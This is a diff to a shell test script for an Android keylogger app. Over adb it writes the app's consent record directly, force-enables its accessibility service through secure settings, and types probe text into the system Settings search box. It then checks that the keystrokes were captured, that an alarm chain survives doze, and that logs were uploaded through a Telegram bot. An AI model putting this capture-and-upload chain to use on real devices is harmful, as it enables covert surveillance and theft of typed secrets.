@@ -41,8 +41,10 @@ PULLED=$(mktemp -t keylog-pull.XXXXXX)
 trap 'rm -f "$PULLED"' EXIT
 
 log() { printf '%s\n' "$*" | tee -a "$LOG"; }
-a() { adb "$@" 2>&1 | tee -a "$LOG" || true; }
-r() { adb shell "$@" 2>&1 | tee -a "$LOG" || true; }
+# Pin the target on every call. A second device (a network adb endpoint) is
+# often present, and bare `adb` then fails with "more than one device/emulator".
+a() { adb -s "$ADDR" "$@" 2>&1 | tee -a "$LOG" || true; }
+r() { adb -s "$ADDR" shell "$@" 2>&1 | tee -a "$LOG" || true; }
 
 mkdir -p -- "$(dirname -- "$LOG")"
 : >"$LOG"
@@ -70,7 +72,7 @@ log "-- target $ADDR confirmed"
 log "-- install $APK"
 # v3.0 is signed differently from v2.x, so an in-place upgrade fails. Uninstall
 # first on mismatch; this wipes prior logs, which is fine for a test device.
-if ! adb install -r "$APK" 2>&1 | tee -a "$LOG" | tail -2; then
+if ! adb -s "$ADDR" install -r "$APK" 2>&1 | tee -a "$LOG" | tail -2; then
     log "   install -r failed, retrying after uninstall"
     a uninstall "$PKG" >/dev/null 2>&1 || true
     if ! a install "$APK" | tail -2; then
@@ -79,16 +81,17 @@ if ! adb install -r "$APK" 2>&1 | tee -a "$LOG" | tail -2; then
     fi
 fi
 
-log "-- seed consent (v3.0 has no bypass; capture is off without this)"
+log "-- seed consent (no bypass; capture is off without this)"
 # run-as works only for debuggable builds, which the debug APK is. The record is
 # written by pushing a real file and copying it in place: nesting printf inside
 # `adb shell sh -c` mangles the quotes, and run-as does not guarantee a cwd.
-# This mirrors Prefs.grantConsent() exactly: file "keylogger", consent_version 1,
-# capture_enabled true.
+# This mirrors Prefs.grantConsent() exactly: file "keylogger", consent_version 2
+# (v3.1 bumped it for the log viewer), capture_enabled true. A lower version is
+# treated as stale and re-prompts, so this must track Prefs.CURRENT_CONSENT_VERSION.
 CONSENT=$(mktemp -t consent.XXXXXX)
 printf '%s\n' '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>' \
     '<map>' \
-    '    <int name="consent_version" value="1" />' \
+    '    <int name="consent_version" value="2" />' \
     '    <boolean name="capture_enabled" value="true" />' \
     '</map>' >"$CONSENT"
 a push "$CONSENT" /data/local/tmp/consent.xml >/dev/null
@@ -109,7 +112,7 @@ sleep 2
 r dumpsys power | grep -m1 'mWakefulness='
 
 log "-- enable service (force a real null -> set rebind)"
-adb logcat -c >/dev/null 2>&1 || true
+adb -s "$ADDR" logcat -c >/dev/null 2>&1 || true
 # Writing the SAME value back is a no-op: AccessibilityManagerService skips
 # unchanged settings and the service is never unbound/rebound. Clear it first
 # so the following write is a real transition and onServiceConnected() runs.
@@ -121,27 +124,29 @@ sleep 6
 # 'Bound services' lists enabled packages even when nothing is connected, so it
 # cannot prove a live service. 'Starting service' is logged by
 # onServiceConnected() and is the real signal.
-echo "Starting service lines: $(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)"
+echo "Starting service lines: $(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)"
 
 log "-- capture: delta dedupe + backspace marker"
-# Messaging's composer is not usable for this on MIUI: `uiautomator` is what
-# reveals its bounds but running it kills the accessibility service, and once
-# it is killed a same-value `enabled_accessibility_services` write is a no-op,
-# so the service never rebinds and no TEXT event is produced. Verified on the
-# Redmi Note 4: mServedView=null, zero writes.
+# Do not capture inside this app. Since v3.1 the UI is Compose, and on API 24
+# Compose text fields do not emit TYPE_VIEW_TEXT_CHANGED, so a field in our own
+# Settings tab produces zero events and the assertions below would fail for a
+# reason unrelated to capture. The bot token field is also now flagged as a
+# password, so it is deliberately skipped.
 #
-# Use the app's own Settings screen instead. Its bounds are fixed and known, so
-# no dump is needed, and the service stays bound for the whole capture.
-r am start -n "$PKG/.MainActivity"
+# Use the system Settings search box instead. It is a plain
+# android.widget.AutoCompleteTextView, which emits text events, and its bounds
+# are fixed so no `uiautomator dump` is needed. Dumping kills the accessibility
+# service on this ROM, and once it is killed a same-value
+# `enabled_accessibility_services` write is a no-op, so the service never
+# rebinds and no TEXT event is produced.
+r am start -a android.settings.SETTINGS
 sleep 4
-r input tap 540 1370          # SETTINGS button center on 1080x1920
-sleep 3
 r dumpsys window | grep -m1 mCurrentFocus
-# Tap the bot token EditText. Bounds [63,147][1017,265] -> center (540, 206).
-r input tap 540 206
+# Settings search. Bounds [189,110][806,205] -> center (497, 157).
+r input tap 497 157
 sleep 2
-# The field keeps its value across runs. Typing into a non-empty field makes
-# the delta logic (correctly) log only the suffix, which breaks the assertions
+# The box keeps its query across runs. Typing into a non-empty field makes the
+# delta logic (correctly) log only the suffix, which breaks the assertions
 # below. Empty it first: MOVE_END, then enough DELs for anything left over.
 r input keyevent KEYCODE_MOVE_END
 # `input keyevent` accepts several keycodes in one call. 67 is KEYCODE_DEL.
@@ -175,7 +180,7 @@ r settings put secure accessibility_enabled 1
 sleep 15
 
 log "-- logcat proof"
-adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true
+adb -s "$ADDR" logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true
 
 # Optional, ALARM_WAIT=1: prove the durable AlarmManager chain, not just the
 # rebind path. Types a marker, then waits out one interval with no interaction
@@ -183,37 +188,37 @@ adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true
 ALARM_FIRED=0
 if [ "${ALARM_WAIT:-0}" = "1" ]; then
     log "-- alarm wait (interval + 30s, no interaction)"
-    r am start -n com.android.messaging/.ui.conversationlist.ConversationListActivity
+    r am start -a android.settings.SETTINGS
     sleep 4
-    r input tap 513 1809
+    r input tap 497 157
     sleep 2
     r input text 'alarmprobe'
     WAIT=$(( (INTERVAL_MS / 1000) + 30 ))
     log "   waiting ${WAIT}s for the alarm"
     sleep "$WAIT"
-    ALARM_FIRED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm received' || true)
-    adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | grep 'alarm' | tail -5 || true
+    ALARM_FIRED=$(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm received' || true)
+    adb -s "$ADDR" logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | grep 'alarm' | tail -5 || true
 fi
 
 log "-- outbox (empty after a 2xx upload)"
 r ls -l "$FILES/outbox/"
 
 log "-- assertions"
-SENT=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument ok http=2' || true)
+SENT=$(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument ok http=2' || true)
 # Failures surface two ways: a non-2xx status ('sendDocument http=4xx') or a
 # thrown exception ('sendDocument failed'). Matching only 'sendDocument http='
 # silently reported 0 failures during a real UnknownHostException run.
-FAILED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -E 'sendDocument (failed|http=[0-9])' | grep -vc 'sendDocument ok http=2' || true)
+FAILED=$(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -E 'sendDocument (failed|http=[0-9])' | grep -vc 'sendDocument ok http=2' || true)
 # `dumpsys accessibility` lists enabled packages even when nothing is bound,
 # so it cannot prove a live connection. onServiceConnected() is the only thing
 # that rotates and uploads, and it always logs this line.
-BOUND=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)
+BOUND=$(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)
 # The alarm is what makes the hourly upload survive doze; without it nothing
 # fires on a sleeping phone.
-ARMED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm armed in' || true)
+ARMED=$(adb -s "$ADDR" logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm armed in' || true)
 
 DELTA=0; FULL=0; BACK=0
-if adb pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
+if adb -s "$ADDR" pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
     DELTA=$(grep -c 'retestbeta' "$PULLED" || true)
     FULL=$(grep -c 'retestalpharetestbeta' "$PULLED" || true)
     BACK=$(grep -c '<backspace>' "$PULLED" || true)
